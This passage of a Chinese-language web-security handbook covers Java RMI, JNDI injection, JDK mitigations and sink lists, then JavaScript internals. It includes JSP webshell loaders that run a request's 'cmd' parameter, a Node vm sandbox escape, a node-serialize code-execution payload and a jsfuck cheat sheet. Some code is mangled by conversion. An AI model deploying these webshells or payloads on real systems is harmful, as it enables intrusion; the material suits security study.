    public static void main(String args[]){ 
        //new object server 
        PersonServer person=new PersonServer("Richard",34); 
        Person_Skeleton skel=new Person_Skeleton(person); 
        skel.start();
    }
}
```

#### Client 实现

```java
public class PersonClient{
    public static void main(String[] args){ 
        try{ 
            Person person=new Person_Stub(); 
            int age=person.getAge(); 
            String name=person.getName(); 
            System.out.println(name+"is"+age+"yearsold"); 
        }
        catch(Throwable t){
            t.printStackTrace();
        }
    }
}
```

#### T3 协议

T3 协议是用于在 WebLogic 服务器和其他类型的 Java 程序之间传输信息的协议，是 Weblogic 对 RMI 规范的实现。简单来说，可以把 T3 视为暴露 JDNI 给用户调用的接口。

#### JRMP

> Java 远程方法协议 (Java Remote Method Protocol，JRMP) 是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 (RMI) 之下、TCP/IP 之上的线路层协议。
>
> JRMP 是一个 Java 特有的、适用于 Java 之间远程调用的基于流的协议，要求客户端和服务器上都使用 Java对象。
>

### JNDI

#### 简介

> JNDI(Java Naming and Directory Interface，Java 命名和目录接口) 是为 Java 应用程序提供命名和目录访问服务的 API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如 RMI、CORBA、LDAP、DNS 等。
>
> 其中 Naming Service 类似于哈希表的 K/V 对，通过名称去获取对应的服务。Directory Service 是一种特殊的 Naming Service，用类似目录的方式来存取服务。
>
> ![image-20220508121830593](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508121830593.png)

#### JNDI 注入

JNDI 注入是 2016 年由 pentester 在 BlackHat USA 上的 A Journey From JNDI LDAP Manipulation To RCE 议题提出的。

其攻击过程如下：

1.  攻击者将 Payload 绑定到攻击者的命名/目录服务中

2.  攻击者将绝对 URL 注入易受攻击的 JNDI 查找方法

3.  应用程序执行查找

4.  应用程序连接到攻击者控制的 JNDI 服务并返回 Payload

5.  应用程序解码响应并触发有效负载

#### 攻击载荷

JDNI主要有几种攻击载荷：

-   CORBA

-   IOR

-   JNDI Reference

-   LDAP

-   Remote Location

-   Remote Object

-   RMI

-   Serialized Object

#### RMI Remote Object

> 攻击者实现一个 RMI 恶意远程对象并绑定到 RMI Registry 上，将编译后的 RMI 远程对象类放在 HTTP/FTP/SMB 等服务器上。其中 Codebase 地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的 RMI 客户端远程加载。
>
> 利用条件如下：

-   RMI 客户端的上下文环境允许访问远程 Codebase。

-   属性 java.rmi.server.useCodebaseOnly 的值为 false。

其中 JDK 6u45、7u21 后，java.rmi.server.useCodebaseOnly 的值默认为 true。

#### RMI + JNDI Reference

> 攻击者通过 RMI 服务返回一个 JNDI Naming Reference，受害者解码 Reference 时会去攻击者指定的远程地址加载 Factory 类。这种方式原理上并非使用 RMI Class Loading 机制，因此不受 java.rmi. server.useCodebaseOnly 系统属性的限制。但是在 JDK 6u132, JDK 7u122, JDK 8u113 后限制了 Nam- ing/Directory 服务中 JNDI Reference 远程加载 Object Factory 类的特性。系统属性 com.sun.jndi.rmi. object.trustURLCodebase 、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类。

#### LDAP + JNDI Reference

> Java 的 LDAP 可以在属性值中存储特定的 Java 对象， LDAP 服务的 Reference 远程加载 Factory 类不受 com.sun.jndi.rmi.object.trustURLCodebase 、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，适用范围更广。

### JDK

#### JDK 6 

**1.6u45**

-   java.rmi.server.useCodebaseOnly 默认为 true，禁用自动加载远程类文件

**2.6u141**

-   com.sun.jndi.rmi.object.trustURLCodebase 默认为 false

-   com.sun.jndi.cosnaming.object.trustURLCodebase 默认为 false

**3.6u211**

-   LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式

#### JDK 7 

**1.7u40**

-   java.io.File 类中添加了 isInvalid 方法，检测文件名中是否包含空字节

**2.7u122**

-   com.sun.jndi.rmi.object.trustURLCodebase 默认为 false

-   com.sun.jndi.cosnaming.object.trustURLCodebase 默认为 false

**3.7u201**

-   LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式

#### JDK 8

-   sun.net.www.protocol 不再支持 gopher 协议

**1.8u113**

-   com.sun.jndi.rmi.object.trustURLCodebase 默认为 false

-   com.sun.jndi.cosnaming.object.trustURLCodebase 默认为 false

**2.8u121**

-   RMI 加入了反序列化白名单机制

-   RMI 远程 Reference 代码默认不信任，影响 RMI 远程 Reference 代码攻击方式

**3.8u191**

-   LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式

**4.8u251**

-   com.sun.org.apache.bcel.internal.util.ClassLoader 类被删除

### 常见 Sink

#### 命令执行/注入

- ```java
  -   java.lang.Runtime.getRuntime().exec()
  
  -   java.lang.ProcessBuilder
  ```

#### XXE

- ```java
  -   java.net.bull.javamelody.PayloadNameRequestWrapper
  
  -   javax.xml.bind.Unmarshaller
  
  -   javax.xml.parsers.DocumentBuilderFactory
  
  -   javax.xml.parsers.SAXParser
  
  -   javax.xml.stream.XMLStreamReader
  
  -   javax.xml.transform.sax.SAXSource
  
  -   javax.xml.transform.sax.SAXTransformerFactory
  
  -   javax.xml.transform.TransformerFactory
  
  -   javax.xml.validation.SchemaFactory
  
  -   javax.xml.validation.Validator
  
  -   javax.xml.xpath.XpathExpression
  
  -   org.apache.commons.digester3.Digester
  
  -   org.apache.ofbiz.base.util.UtilXml
  
  -   org.dom4j.io.SAXReader
  
  -   org.jdom.input.SAXBuilder
  
  -   org.jdom2.input.SAXBuilder
  
  -   org.xml.sax.helpers.XMLReaderFactory
  
  -   org.xml.sax.XMLReader
  ```

#### SSRF

- ```java
  -   HttpClient.execute
  
  -   HttpClients.execute
  
  -   HttpURLConnection.getInputStream
  
  -   ImageIO.read
  
  -   OkHttpClient.newCall.execute
  
  -   Request.Get.execute
  
  -   Request.Post.execute
  
  -   URL.openStream
  
  -   URLConnection.getInputStream
  ```

#### 反序列化

##### 相关 Sink 函数

- ```java
  -   JSON.parseObject
  
  -   ObjectInputStream.readObject
  
  -   ObjectInputStream.readUnshared
  
  -   ObjectMapper.readValue
  
  -   XMLDecoder.readObject
  
  -   XStream.fromXML
  
  -   Yaml.load
  ```

##### Magic Call

以下的魔术方法都会在反序列化过程中被自动的调用。

-   readObject

-   readExternal

-   readResolve

-   readObjectNoData

-   validateObject

-   finalize

#### 主流 JSON 库

> 主流的 JSON 库有 Gson、Jackson、Fastjson 等，因为 JSON 常在反序列化中使用，所以相关库都有较大的影响。
>
> 其中 Gson 默认只能反序列化基本类型，如果是复杂类型，需要程序员实现反序列化机制，相对比较安全。
>
> Jackson 除非指明 @jsonAutoDetect，Jackson 不会反序列化非 public 属性。在防御时，可以不使用 enableDe- faultTyping 方法。相关 CVE 有 CVE-2017-7525、CVE-2017-15095。
>
> FastJson 是阿里巴巴的开源 JSON 解析库，支持将 Java Bean 序列化为 JSON 字符串，也支持从 JSON 字符串反序列化到 Java Bean，相关 CVE 有 CVE-2017-18349 等。
>
> FastJson 常见的 Sink 点有：

-   JSON.toJSONString

-   JSON.parseObject

-   JSON.parse

### WebShell

#### BCEL 字节码

```java
String bcelCode="..."; 
response.getOutputStream().write(String.valueOf(newClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter("cmd")).toString()).getBytes());
```

#### 自定义类加载器

```java
response.getOutputStream().write(newClassLoader(){ 
    @Override
    public Class<?> loadClass(Stringname) throws ClassNotFoundException{ 
        if(name.contains("shell")){ 
            return findClass(name); 
        }
        return super.loadClass(name);
    }
    @Override 
    protected Class<?> findClass(Stringname) throws ClassNotFoundException{ 
        try{ 
            byte[] bytes=Base64.getDecoder().decode("..."); 
            PermissionCollection pc=new Permissions(); 
            pc.add(newAllPermission()); 
            ProtectionDomain protectionDomain=new ProtectionDomain(newCodeSource(null,(Certificate[]) null), pc, this,null); 
            return this.defineClass(name,bytes,0, bytes.length, protectionDomain);
        }
        catch(Exceptione){ 
            e.printStackTrace();
        }
        return super.findClass(name); 
    }
}.loadClass("shell").getConstructor(String.class).newInstance(request.getParameter("cmd")).toString().getBytes());
%>
```



#### 执行命令变式

-   java.lang.ProcessBuilder#start

-   java.lang.Runtime#exec

-   TemplatesImpl

#### 基于反射

-   class.forName

-   MethodAccessor.invoke

-   Method.invoke

#### 其他 Shell 变式

-   java.beans.Expression

-   java.lang.ClassLoader

-   java.net.URLClassLoader

-   jdk.nashorn.internal.runtime.ScriptLoader

-   ObjectInputStream.resolveClass

-   ScriptEngine.eval

-   ScriptEngineManager

-   ToolProvider.getSystemJavaCompiler

#### Tomcat 容器

-   Servlet

-   Filter

-   Listener

### 参考链接

#### 官方文档

-   [ognl](http://commons.apache.org/proper/commons-ognl/)

-   [Java SE Security Guide](https://docs.oracle.com/javase/9/security/toc.htm)

-   [Java RMI Release Notes for JDK 6](https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html)

-   [Java Release Notes for JDK 7](https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html)

#### 机制说明

-   [深入理解 Java 类加载](https://www.cnblogs.com/czwbig/p/11127222.html)

#### 反序列化

##### 标准

-   [Java 序列化【草案一】](https://blog.csdn.net/silentbalanceyh/article/details/8183849)

-   [Java 14 Object Serialization Specification](https://docs.oracle.com/en/java/javase/14/docs/specs/serialization/index.html)

##### 利用与技巧

-   [Marshalling Pickles how deserializing objects can ruin your day](https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles)

-   [AppSecCali 2015: Marshalling Pickles](https://frohoff.github.io/appseccali-marshalling-pickles/)

-   [More serialization hacks with AnnotationInvocationHandler](http://wouter.coekaerts.be/2015/annotationinvocationhandler)

-   [Pure JRE 8 RCE Deserialization gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)

-   [Breaking Defensive Serialization](http://slightlyrandombrokenthoughts.blogspot.com/2010/08/breaking-defensive-serialization.html)

-   [Java 反序列化漏洞从入门到深入](https://mp.weixin.qq.com/s/nNTw3HMnkX63d9ybdx3USQ)

-   [Java 反序列化漏洞通用利用分析](https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/)

-   [JRE8u20 反序列化漏洞分析](http://www.freebuf.com/vuls/176672.html)

-   [浅析 Java 序列化和反序列化](https://xz.aliyun.com/t/3847)

-   [Commons Collections Java 反序列化漏洞深入分析](https://security.tencent.com/index.php/blog/msg/97)

-   [FAR SIDES OF JAVA REMOTE PROTOCOLS](https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf)

-   [JDK8u20 反序列化漏洞新型 PoC 思路及具体实现](https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA)

-   [Pwn a CTF Platform with Java JRMP Gadget](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html)

-   [漫谈 JEP 290](https://nosec.org/home/detail/4846.html)

##### 框架

-   [WebLogic 反序列化漏洞漫谈](https://www.freebuf.com/articles/web/169770.html)

-   [从 WebLogic 看反序列化漏洞的利用与防御](https://cert.360.cn/report/detail?id=c8eed4b36fe8b19c585a1817b5f10b9e)

-   [JSON 反序列化之殇](https://github.com/shengqi158/fastjson-remote-code-execute-poc/blob/master/Java_JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87_%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A.pdf)

-   [Shiro 组件漏洞与攻击链分析](https://mp.weixin.qq.com/s/j_gx9C_xL1LyrnuFFPFsfg)

-   [Application Security With Apache Shiro](https://www.infoq.com/articles/apache-shiro/)

-   [Shiro 安全框架【快速入门】](https://zhuanlan.zhihu.com/p/54176956)

-   [Shiro 实战 (四) - 过滤器机制](https://cloud.tencent.com/developer/article/1367702)

##### 沙箱

-   [Java Sandbox Escape](http://phrack.org/papers/escaping_the_java_sandbox.html)

##### 框架

-   [Struts](https://github.com/apache/struts)

-   [Struts Examples](https://github.com/apache/struts-examples)

-   [Eclipse Jetty](https://github.com/eclipse/jetty.project)

-   [SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit) SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist

##### 框架利用技巧

-   [Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索](https://landgrey.me/blog/22/)

#### RMI

-   [Java RMI 与 RPC 的区别](https://www.cnblogs.com/ygj0930/p/6542811.html)

-   [Remote Method Invocation (RMI)](https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html)

-   [Java 中 RMI、JNDI、LADP、JRMP、JMX、JMS 那些事儿](https://paper.seebug.org/1091)

-   [Oracle: Developing T3 Clients](http://docs.oracle.com/cd/E11035_01/wls100/client/t3.html)

#### JNDI

-   [Overview of JNDI](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html)

-   [关于 JNDI 注入](https://paper.seebug.org/417/)

-   [A Journey From JNDI LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)

-   [如何绕过高版本 JDK 的限制进行 JNDI 注入](https://www.freebuf.com/column/207439.html)

#### WebShell

-   [各种姿势 jsp webshell](https://xz.aliyun.com/t/7798)

#### 其他漏洞

-   [JAVA 常见的 XXE 漏洞写法和防御](http://blog.spoock.com/2018/10/23/java-xxe/index.html)



## 5.4 JavaScript

### 5.4.1 ECMAScript

#### 简介

ECMAScript 是一种由 ECMA 国际通过 ECMA-262 标准化的脚本程序设计语言，它往往被称为 JavaScript或 JScript。简单的，可以认为 ECMAScript 是 JavaScript 的一个标准，但实际上后两者是 ECMA-262 标准的实现和扩展。

#### ES6 特性

-   const / let

-   模板字面量

- 解构
  - [a, b\] = \[10, 20\]
  
-   对象字面量简写法
-   for\...of 循环
-   \...xxx 展开运算符
-   可变参数
-   箭头函数
-   默认参数函数
-   默认值与解构
-   类




### 5.4.2 引擎

#### V8

V8 是 Chrome 的 JavaScript 语言处理程序（VM）。其引擎由 TurboFan、Ignition 和 Liftoff 组成。其中Turbofan 是其优化编译器，Ignition 则是其解释器，Liftoff 是 WebAssembly 的代码生成器。

#### SpiderMonkey

SpiderMonkey 是 Mozilla 项目的一部分，是一个用 C/C++ 实现的 JavaScript 脚本引擎。

#### JavaScriptCore

JavaScriptCore 的优化执行分为四个部分，LLInt、Baseline、DFG、FTL。LLInt 是最开始的解释执行部分，Baseline 是暂时的 JIT，DFG 阶段开始做一定的优化，FTL 阶段做了充分的优化。

#### ChakraCore

ChakraCore 是一个完整的 JavaScript 虚拟机，由微软实现，用于 Edge 浏览器以及 IE 的后期版本中。

#### JScript

JScript 是由微软开发的脚本语言，是微软对 ECMAScript 规范的实现，用于 IE 的早期版本中。

#### JerryScript

JerryScript 是一个适用于嵌入式设备的小型 JavaScript 引擎，由三星开发并维护。

### 5.4.3 WebAssembly

#### 简介

简而言之，WASM 是一种分发要在浏览器中执行的代码的新方法。它是一种二进制语言，但是无法直接在处理器上运行。在运行时，代码被编译为中间字节代码，可以在浏览器内快速转换为机器代码，然后比传统 JavaScript 更有效地执行。

#### 执行

虽然浏览器可能以不同的方式来实现 Wasm 支持，但是使用的沙盒环境通常是 JavaScript 沙箱。

在浏览器中运行时，Wasm 应用程序需要将其代码定义为单独的文件或 JavaScript 块内的字节数组。然后使用 JavaScript 实例化文件或代码块，目前不能在没有 JavaScript 包装器的情况下直接在页面中调用 Wasm。

虽然 Wasm 可以用 C / C++ 等语言编写，但它本身不能与沙箱之外的环境进行交互。这意味着当 Wasm 应用程序想要进行输出文本等操作时，它需要调用浏览器提供的功能，然后使用浏览器在某处输出文本。

Wasm 中的内存是线性的，它在 Wasm 应用程序和 JavaScript 之间共享。当 Wasm 函数将字符串返回给 JavaScript 时，它实际上返回一个指向 Wasm 应用程序内存空间内位置的指针。Wasm 应用程序本身只能访问分配给它的 JavaScript 内存部分，而不是整个内存空间。

#### 安全

Wasm 的设计从如下几个方面考虑来保证 Wasm 的安全性：

-   保护用户免受由于无意的错误而导致漏洞的应用程序的侵害
-   保护用户免受故意编写为恶意的应用程序的侵害
-   为开发人员提供良好的缓解措施

具体的安全措施有：

- Wasm 应用程序在沙箱内运行

- Wasm 无法对任意地址进行函数调用。Wasm 采用对函数进行编号的方式，编号存储在函数表中

- 间接函数调用受类型签名检查的约束

- 调用堆栈受到保护，这意味着无法覆盖返回指针

- 实现了控制流完整性，这意味着调用意外的函数将失败

  

### 5.4.4 作用域与闭包

#### 作用域与作用域链作用域

简单来说， 作用域就是变量与函数的可访问范围， 即作用域控制着变量与函数的可见性和生命周期。JavaScript 的作用域是靠函数来形成的，也就是说一个函数的变量在函数外不可以访问。

作用域可以分为全局作用域、局部作用域和块级作用域，其中全局作用域主要有以下三种情况：

-   函数外面定义的变量拥有全局作用域

-   未定义直接赋值的变量自动声明为拥有全局作用域

-   window 对象的属性拥有全局作用

> 局部作用域一般只在固定的代码片段内可访问到，最常见的例如函数内部，所以也会把这种作用域称为函数作用域。

#### 作用域泄漏

在 ES5 标准时，只有全局作用域和局部作用域，没有块级作用域，这样可能会造成变量泄漏的问题。例如：

> ```js
> var i=1;
> function f(){
>     console.log(i)
>     if(true){
>         var i=2;
>     }
> }
> f();//undefined
> ```

#### 作用域提升（var Hoisting）

在 JavaScript 中，使用 var 在函数或全局内任何地方声明变量相当于在其内部最顶上声明它，这种行为称为Hoisting。例如下面这段代码等效于第二段代码：

```js
function foo(){ 
    console.log(x); //=>  undefined 
    var x=1;
    console.log(x);//=>1
}
foo();
```

```js
function foo(){ 
    var x; 
    console.log(x);//=>undefined
    x=1;
    console.log(x);//=>1
}
foo();
```

#### 作用域链

当函数被执行时，总是先从函数内部找寻局部变量，如果找不到相应的变量，则会向创建函数的上级作用域寻找，直到找到全局作用域为止，这个过程被称为**作用域链。**

#### 闭包

函数与对其状态即词法环境（lexical environment）的引用共同构成闭包（closure）。也就是说，闭包可以让你从内部函数访问外部函数作用域。在 JavaScript，函数在每次创建时生成闭包。

在 JavaScript 中，并没有原生的对 private 方法的支持，即一个元素/方法只能被同一个类中的其它方法所调用。而闭包则是一种可以被用于模拟私有方法的方案。另外闭包也提供了管理全局命名空间的能力，避免非核心的方法或属性污染了代码的公共接口部分。下面是一个简单的例子：

```js
var Counter=(function(){
    var privateCounter=0;
    function changeBy(val){ 
        privateCounter+=val;
    }
    return {
        increment: function(){
            changeBy(1);
        },
        decrement:function(){
            changeBy(-1);
        },
        value:function(){
            return privateCounter;
        }
    }
})();

console.log(Counter.value());/*logs0*/
Counter.increment();
Counter.increment();
console.log(Counter.value());/*logs2*/
Counter.decrement();
console.log(Counter.value());/*logs1*/
```

#### 全局对象

全局对象是一个特殊的对象，它的作用域是全局的。

全平台可用的全局对象是 globalThis ，它跟全局作用域里的 this 值相同。另外在浏览器中存在 self 和window 全局对象，Web Workers 中存在 self 全局对象，Node.js 中存在 global 全局对象。

### 5.4.5 严格模式

#### 简介

在 ES5 中，除了正常的运行模式之外，添加了严格模式（strict mode），这种模式使得代码显式地脱离"马虎模式/稀松模式/懒散模式"（sloppy）模式在更严格的条件下运行。**严格模式不仅仅是一个子集：它的产生是为了形成与正常代码不同的语义**。

引入严格模式的目的主要是：

-   通过抛出错误来消除了一些原有静默错误

-   消除 JavaScript 语法的一些不合理、不严谨之处，减少一些怪异行为

-   消除代码运行的一些不安全之处，保证代码运行的安全

-   修复了一些导致 JavaScript 引擎难以执行优化的缺陷，提高编译器效率，增加运行速度

-   禁用了在 ECMAScript 的未来版本中可能会定义的一些语法，为未来新版本的 JavaScript 做铺垫

#### 调用

严格模式使用 \"use strict\"; 字符串开启。对整个脚本文件而言，可以将 \"use strict\" 放在脚本文件的第一行使整个脚本以严格模式运行。如果这行语句不在第一行则不会生效，会以正常模式运行。

对单个函数而言，将 \"use strict\" 放在函数体的第一行，则整个函数以严格模式运行。

#### 行为改变

在严格模式中，主要有以下的行为更改：

##### 1. 全局变量显式声明

在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。

```js
"usestrict";
for(i=0;i<2;i++){
    //ReferenceError:iisnotdefined
}
```

##### 2. 禁止使用 with 语句

with 语句无法在编译时就确定，属性到底归属哪个对象，这会影响编译效率，所以在严格模式中被禁止。

##### 3. 创设 eval 作用域

正常模式下，eval 语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval 语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于 eval 内部。

##### 4. 禁止删除变量

严格模式下无法删除变量。只有 configurable 设置为 true 的对象属性，才能被删除。

##### 5. 显式报错

正常模式下一些错误只会默默地失败，但是严格模式下将会报错，包括以下几种场景：

-   对一个对象的只读属性进行赋值

-   对一个使用 getter 方法读取的属性进行赋值

-   对禁止扩展的对象添加新属性

-   删除一个不可删除的属性

##### 6. 语法错误

严格模式新增了一些语法错误，包括：

-   对象不能有重名的属性

-   函数不能有重名的参数

-   禁止八进制表示法

-   函数必须声明在顶层

-   ##### 新增保留字

    -   class

    -   enum

    -   export

    -   extends

    -   import

    -   super

##### 7. 安全增强

-   禁止 this 关键字指向全局对象

-   禁止在函数内部遍历调用栈

##### 8. 限制 arguments 对象

-   不允许对 arguments 赋值

-   arguments 不再追踪参数的变化

-   禁止使用 arguments.callee



### 5.4.6 异步机制

#### async / await

async function 关键字用来在表达式中定义异步函数。

#### Promise

Promise 对象是一个代理对象（代理一个值），被代理的值在 Promise 对象创建时可能是未知的。它允许你为异步操作的成功和失败分别绑定相应的处理方法（handlers）。这让异步方法可以像同步方法那样返回值，但并不是立即返回最终执行结果，而是一个能代表未来出现的结果的 promise 对象

一个 Promise 有以下几种状态:

-   pending: 初始状态，既不是成功，也不是失败状态。

-   fulfilled: 意味着操作成功完成。

-   rejected: 意味着操作失败。

pending 状态的 Promise 对象可能会变为 fulfilled 状态并传递一个值给相应的状态处理方法，也可能变为失败状态（rejected）并传递失败信息。当其中任一种情况出现时，Promise 对象的 then 方法绑定的处理方法（handlers ）就会被调用（then 方法包含两个参数：onfulfilled 和 onrejected，它们都是 Function 类型。当 Promise 状态为 fulfilled 时，调用 then 的 onfulfilled 方法，当 Promise 状态为 rejected 时，调用 then 的 onrejected 方法，所以在异步操作的完成和绑定处理方法之间不存在竞争）。

因为 Promise.prototype.then 和 Promise.prototype.catch 方法返回 promise 对象，所以它们可以被链式调用。

#### 执行队列

JavaScript 中的异步运行机制如下：

-   所有同步任务都在主线程上执行，形成一个执行栈

-   主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列之中放置一个事件。

-   一旦执行栈中的所有同步任务执行完毕，系统就会读取任务队列，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。

-   主线程不断重复上面的第三步。

其中浏览器的内核是多线程的，在浏览器的内核中不同的异步操作由不同的浏览器内核模块调度执行，异步操作会将相关回调添加到任务队列中。可以分为 **DOM 事件、时间回调、网络回调**三种：

-   DOM 事件：由浏览器内核的 DOM 模块来处理，当事件触发的时候，回调函数会被添加到任务队列中。

-   时间回调：setTimeout / setInterval 等函数会由浏览器内核的 timer 模块来进行延时处理，当时间到达的时候，将回调函数添加到任务队列中。

-   网络回调：ajax / fetch 等则由浏览器内核的 network 模块来处理，在网络请求完成返回之后，才将回调添加到任务队列中。

### 5.4.7 原型链

#### 显式原型和隐式原型

JavaScript 的原型分为显式原型（explicit prototype property）和隐式原型（implicit prototype link）。

其中显式原型指 prototype，是函数的一个属性，这个属性是一个指针，指向一个对象，显示修改对象的原型的属性，只有函数才有该属性。

隐式原型指 JavaScript 中任意对象都有的内置属性 prototype。在 ES5 之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过 、\_\_proto__ 来访问。ES5 中有了对于这个内置属性标准的 Get 方法 Object.getPrototypeOf() 。隐式原型指向创建这个对象的函数 (constructor) 的 prototype， \_\_proto__ 指向的是当前对象的原型对象，而 prototype 指向的，是以当前函数作为构造函数构造出来的对象的原型对象。

显式原型的作用用来实现基于原型的继承与属性的共享。隐式原型的用于构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问 obj 这个对象中的 x 属性时，如果在 obj 中找不到，那么就会沿着\_\_proto__ 依次查找。

```
Note: Object.prototype 这个对象是个例外，它的__proto__ 值为 null
```

#### new 的过程

new 的过程拆分成以下三步：

```js
var p={}; //初始化一个对象 p 
p. __proto__ = Person.prototype; 
Person.call(p); //构造 p，也可以称之为初始化 p
```

关键在于第二步，我们来证明一下：

```js
var Person=function(){};
var p=new Person();
alert(p.__proto__===Person.prototype);
```

这段代码会返回 true。说明我们步骤 2 是正确的。

#### 示例

```js
var Person = function(){};
Person.prototype.sayName = function() {
	alert("My Name is Jacky");
};
Person.prototype.age = 27;
var p = new Person();
p.sayName();
```

> p 是一个引用指向 Person 的对象。我们在 Person 的原型上定义了一个 sayName 方法和 age 属性，当我们执行 p.age 时，会先在 this 的内部查找（也就是构造函数内部），如果没有找到然后再沿着原型链向上追溯。
>
> 这里的向上追溯是怎么向上的呢？这里就要使用 proto 属性来链接到原型（也就是 Person.prototype）进行查找。最终在原型上找到了 age 属性。

#### 原型链污染

如前文提到的，JavaScript 是动态继承，通过 proto 修改自身对象时会影响到有相同原型的对象。因此当键值对是用户可控的情况下，就可能出现原型链污染。

### 5.4.8 沙箱逃逸

#### 前端沙箱

在前端中，可能会使用删除 eval ，重写 `Function.prototype.constructor / GeneratorFunction / AsyncFunction` 等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新 iframe 的方式来获取新的执行环境。

#### 服务端沙箱

JavaScript 提供了原生的 vm 模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的

JavaScript API 和全局的 NodeJS 环境。 在原生的沙箱模块中，常用的逃逸方式为：

```js
const vm = require('vm');
const sandbox = {};
const whatIsThis = vm.runInNewContext(`
    const ForeignObject = this.constructor;
    const ForeignFunction = ForeignObject.constructor;
    const process = ForeignFunction("return process")();
    const require = process.mainModule.require;
    require("fs");
`, sandbox);
```

考虑到 JavaScript 原生 vm 模块的缺陷，有开发者设计了 vm2 来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：

```js
vm.runInNewContext(
'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());});␣
,→while(1)console.log(Date.now())',
{console:{log(){console.log.apply(console,arguments);}}},
{timeout:5}
);
```

### 5.4.9 反序列化

#### 简介

JavaScript 本身并没有反序列化的实现，但是一些库如 node-serialize、serialize-to-js 等支持了反序列化功能。这些库通常使用 JSON 形式来存储数据，但是和原生函数 JSON.parse、JSON.stringify 不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。

#### Payload 构造

下面是一个最简单的例子，首先获得序列化后的输出

```js
var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.
,→log(stdout) });
},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

上面执行后会返回

```
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error,␣
,→stdout, stderr) { console.log(stdout) });}"}
```

不过这段 payload 反序列化后并不会执行，但是在 JS 中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如 (function () { /\* code \*/ } ()); 这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的 payload 测试如下:

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\',
,→ function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```

#### Payload 构造 II

以上提到的是 node-serialize 这类反序列化库的构造方式，还有一类库如 funcster，是使用直接拼接字符串构造函数的方式来执行。

```js
return "module.exports=(function(module,exports){return{" + entries + "};})();";
```

这种方式可以使用相应的闭合来构造 payload。

### 5.4.10 jsfuck cheat sheet

#### Basic values

-   undefined \> \[\]\[\[\]\]

-   false \> !\[\]

-   true \> !!\[\]

-   NaN \> +\[!\[\]\]

-   0 \> +\[\]

-   1 \> +!+\[\]

-   2 \> !+\[\]+!+\[\]

#### Basic strings

-   \'\' \> \[\]+\[\]

-   \'undefined\' \> \[\]+\[\]\[\[\]\]

-   \'false\' \> \[\]+!\[\]

-   \'true\' \> \[\]+!!\[\]

-   \'NaN\' \> \[\]+(+\[!\[\]\])

-   \'0\' \> \[\]+(+\[\])

-   \'1\' \> \[\]+(+!+\[\])

-   \'2\' \> \[\]+(!+\[\]+!+\[\])

-   \'10\' \> \[+!+\[\]\]+\[+\[\]\]

-   \'11\' \> \[+!+\[\]\]+\[+!+\[\]\]

-   \'100\' \> \[+!+\[\]\]+\[+\[\]\]+(+\[\])

#### Higher numbers

-   10 \> +(\[+!+\[\]\]+\[+\[\]\])

-   11 \> +(\[+!+\[\]\]+\[+!+\[\]\])

-   100 \> +(\[+!+\[\]\]+\[+\[\]\]+(+\[\]))

#### String alphabet

-   \'a\' \> (\[\]+!\[\])\[+!+\[\]\]

-   \'d\' \> (\[\]+\[\]\[\[\]\])\[+!+\[\]+!+\[\]\]

-   \'e\' \> (\[\]+!+\[\])\[+!+\[\]+!+\[\]+!+\[\]\]

-   \'f\' \> (\[\]+!\[\])\[+\[\]\]

-   \'i\' \> (\[\]+\[\]\[\[\]\])\[+!+\[\]+!+\[\]+!+\[\]+!+\[\]+!+\[\]\]

-   \'l\' \> (\[\]+!\[\])\[+!+\[\]+!+\[\]\]

-   \'n\' \> (\[\]+\[\]\[\[\]\])\[+!+\[\]\]

